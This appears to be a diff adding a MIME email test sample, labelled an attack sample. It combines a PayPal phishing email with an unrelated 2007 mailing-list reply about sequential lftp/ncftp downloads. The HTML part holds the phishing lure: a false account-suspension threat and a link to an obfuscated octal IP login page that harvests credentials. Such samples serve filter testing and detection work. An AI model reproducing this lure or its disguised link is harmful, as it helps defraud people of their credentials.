@@ -1,0 +1,240 @@
+From: nyfeders@msn.com
+To: sherry_radack@justex.net
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+--BOUNDARY
+0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <auto-000009581943@smtp1.ga-1.com>
+Status: O
+Content-Length: 6273
+Lines: 133
+
+<html>
+<head>
+ 
+<title>Untitled Document</title>
+<style type="text/css">
+<!--
+
+
+
+#message #yiv1522535104 
+.style1 {
+font-size:24px;font-weight:bold;}
+-->
+</style>
+</head>
+
+ 
+<table width="400" border="0">
+  <tr>
+    <td height="266"><div id="xptHeader">
+      <table align="center" border="0" cellpadding="0" cellspacing="0">
+        <tr>
+          <td nowrap><img border="0" src="http://www.paypalobjects.com/en_US/i/logo/paypal_logo.gif" alt=""></td>
+          <td align="center" class="cobrand" width="100%">&nbsp;</td>
+          <td align="right" nowrap>&nbsp;</td>
+        </tr>
+      </table>
+    </div>
+      <div id="xptTabs"></div>
+      <div id="xptContentMain">
+        <table align="center" border="0" cellpadding="0" cellspacing="0" width="600">
+          <tr>
+            <td><img alt="" border="0" height="1" src="http://www.paypalobjects.com/en_US/i/scr/pixel.gif"
+ width="600"></td>
+          </tr>
+          <tr>
+            <td><div id="xptTitle">
+                <table width="103%" border="0" align="center" cellpadding="0" cellspacing="0" class="main">
+                  <tr>
+                    <td width="100%"><img alt="" border="0" height="2"
+ src="http://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1"></td>
+                  </tr>
+                  <tr>
+                    <td><hr></td>
+                  </tr>
+                </table>
+            </div></td>
+          </tr>
+          <tr>
+            <td valign="top"><table align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
+                <tr>
+                  <td><table align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
+                      <tr valign="top">
+                        <td class="fullRowNoLeftNav"><img
+ src="https://www.paypalobjects.com/WEBSCR-455-20070404-1/en_US/i/header/hpPrivacy_shopwoutsharing_563x115.jpg" border="0" alt=""></td>
+                      </tr>
+                  </table></td>
+                </tr>
+                <tr>
+                  <td class="verticalSpacerHigh" width="100%"><img alt="" border="0"
+ src="http://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1"></td>
+                </tr>
+                <tr>
+                  <td class="verticalSpacerHigh" width="100%"><img alt="" border="0"
+ src="http://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1"></td>
+                </tr>
+            </table></td>
+          </tr>
+        </table>
+        <p align="center" class="style1">Warning Notification</p>
+      </div></td>
+  </tr>
+  <tr>
+    <td height="266"><table width="505" border="0" align="center" cellpadding="0" cellspacing="0">
+      <tr valign="top">
+        <td colspan="2" rowspan="2"><img height="10" width="10"
+ src="http://www.paypalobjects.com/en_US/i/scr/scr_tLftCnr_10x10.jpg" border="0" alt=""></td>
+        <td bgcolor="#cccccc" height="1"><img height="1" width="1"
+ src="http://www.paypalobjects.com/en_US/i/scr/pixel.gif" border="0" alt=""></td>
+        <td colspan="2" rowspan="2"><img height="10" width="10"
+ src="http://www.paypalobjects.com/en_US/i/scr/scr_tRgtCnr_10x10.jpg" border="0" alt=""></td>
+      </tr>
+      <tr>
+        <td height="9"><img height="1" width="1" src="http://www.paypalobjects.com/en_US/i/scr/pixel.gif" border="0"
+ alt=""></td>
+      </tr>
+      <tr>
+        <td bgcolor="#cccccc" width="1"><img alt="" border="0" src="http://www.paypalobjects.com/en_US/i/scr/pixel.gif"
+ class="verticalSpacerLow" width="1" height="1"><br>
+            <img height="1" width="1" src="http://www.paypalobjects.com/en_US/i/scr/pixel.gif" border="0" alt=""> </td>
+        <td width="9"><img height="1" width="1" src="http://www.paypalobjects.com/en_US/i/scr/pixel.gif" border="0"
+ alt=""></td>
+        <td class="head" width="580"><p align="left">Dear PayPal Member , </p>
+          <p align="left"><span class="fullRowNoLeftNav">It has come to our attention that your?<span style="FONT-SIZE:10pt;COLOR:black;FONT-FAMILY:Verdana;">PayPal<sup></sup></span> account information needs to be?
+updated as part of our continuing commitment to protect your account and to?
+reduce the instance of fraud on our website. If you could please take 5-10 minutes
+out of your online experience and update your personal records you will not run into?any future problems with the online service.</span></p>
+          <p align="left">However, failure to update your records will result in account suspension.?
+Please update your records?before?<strong>April 18, 2007</strong>.</p>
+          <p align="left">Once you have updated your account records, your?<span style="FONT-SIZE:10pt;COLOR:black;FONT-FAMILY:Verdana;">PayPal<sup></sup></span> account activity will not be interrupted and will continue as normal.</p>
+          <p align="center"><a rel="nofollow"
+ target="_blank" href="http://0112.0000.0067.0012/MembersLogIn/index.htm"
+><strong>Click here to update your PayPal account information</strong></a></p></td>
+        <td width="9">&nbsp;</td>
+        <td bgcolor="#cccccc" width="1"><img height="1" width="1"
+ src="http://www.paypalobjects.com/en_US/i/scr/pixel.gif" border="0" alt=""></td>
+      </tr>
+      <tr>
+        <td colspan="2" rowspan="2"><img height="10" width="10"
+ src="http://www.paypalobjects.com/en_US/i/scr/scr_bLftCnr_10x10.jpg" border="0" alt=""></td>
+        <td height="9"><img height="1" width="1" src="http://www.paypalobjects.com/en_US/i/scr/pixel.gif" border="0"
+ alt=""></td>
+        <td colspan="2" rowspan="2"><img height="10" width="10"
+ src="http://www.paypalobjects.com/en_US/i/scr/scr_bRgtCnr_10x10.jpg" border="0" alt=""></td>
+      </tr>
+      <tr>
+        <td bgcolor="#cccccc" height="1"><img height="1" width="1"
+ src="http://www.paypalobjects.com/en_US/i/scr/pixel.gif" border="0" alt=""></td>
+      </tr>
+    </table>
+      <table align="center" border="0" cellpadding="0" cellspacing="0">
+        <tr>
+          <td><p>&nbsp;</p>
+              <p class="lastPara">Copyright &copy; 1999-2007 PayPal. All rights reserved.<br>
+                  <a rel="nofollow" target="_blank" href="http://www.paypal.com/cgi-bin/webscr?cmd=p/gen/fdic-outside">Information about FDIC 
+pass-through insurance</a></p></td>
+        </tr>
+      </table>
+    <p>&nbsp;</p></td>
+  </tr>
+</table>
+ 
+</html>
+
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+Content-Type: text/plain
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+Hi Greg. Have you perhaps tried get file1.tar file2.tar? I have not tried this myself; however, I think it may be workable. As for how often Ncftp/Lftp will try putting before giving up, I 
+think Lftp is more agressive than Ncftp. In fact, I have never actually seen Lftp time out a transfer because of a drop in net connection/etc, whereas Ncftp times out after a while. There may 
+be a way to get Ncftp to wait forever; perhaps there is a setting somewhere to control the timeout value(s).
+On Sun, Jun 24, 2007 at 11:26:22PM -0700, Gregory Nowak wrote:
+> -----BEGIN PGP SIGNED MESSAGE-----
+> Hash: SHA1
+> 
+> Hi all.
+> 
+> Say I want to get 2 files via ftp, but I want to do it in a specific
+> order, and I don't want file2 to start downloading until file1 is
+> finished downloading. For example, if I were to execute get file1.tar,
+> and get file2.tar, I want get file2.tar to be executed only after get
+> file1.tar is done.
+> 
+> I see that lftp has a queue command. Does anyone know if this would
+> work the way I expect? What I mean is if I execute:
+> 
+> queue get file1.tar
+> queue get file2.tar
+> 
+> in lftp, would that in fact wait to download file2.tar until the
+> download of file1.tar was complete?
+> 
+> If the queue command in lftp doesn't work this way, then is there
+> another command that would do what I want? If lftp can't do what I
+> want, then can ncftp do that? If so, then how? I have looked through
+> the ncftp man page as well, and this doesn't seem to be doable in
+> ncftp. If neither lftp or ncftp can do what I want, then is there
+> another ftp client for gnu/linux that can?
+> 
+> Just to clarify, I don't want to time-schedule the downloads, I simply
+> want them to happen sequentially one after another, in a specific
+> order, (I.E. file2.tar can download right after file1.tar, but it
+> can't start downloading while file1.tar is still being downloaded).
+> 
+> On another note, does anyone know for sure if put in lftp or ncftp
+> will retry an upload until it successfully completes, if the upload
+> keeps being interrupted, say due to network issues? I'm fairly sure the
+> answer here for both programs is yes, but I wanted to make
+> certain. Thanks in advance.
+> 
+> Greg
+> 
+> 
+> - -- 
+> web site: http://www.romuald.net.eu.org
+> gpg public key: http://www.romuald.net.eu.org/pubkey.asc
+> skype: gregn1
+> (authorization required, add me to your contacts list first)
+> 
+> - --
+> Free domains: http://www.eu.org/ or mail dns-manager@EU.org
+> -----BEGIN PGP SIGNATURE-----
+> Version: GnuPG v1.4.6 (GNU/Linux)
+> 
+> iD8DBQFGf2AO7s9z/XlyUyARAgA1AKDdu8Li7khgpV4H0rRh424xjude3ACdFnRw
+> Tg/Zd+5f0BiU2MmlslaaXWk=
+> =QDyq
+> -----END PGP SIGNATURE-----
+-BOUNDARY--
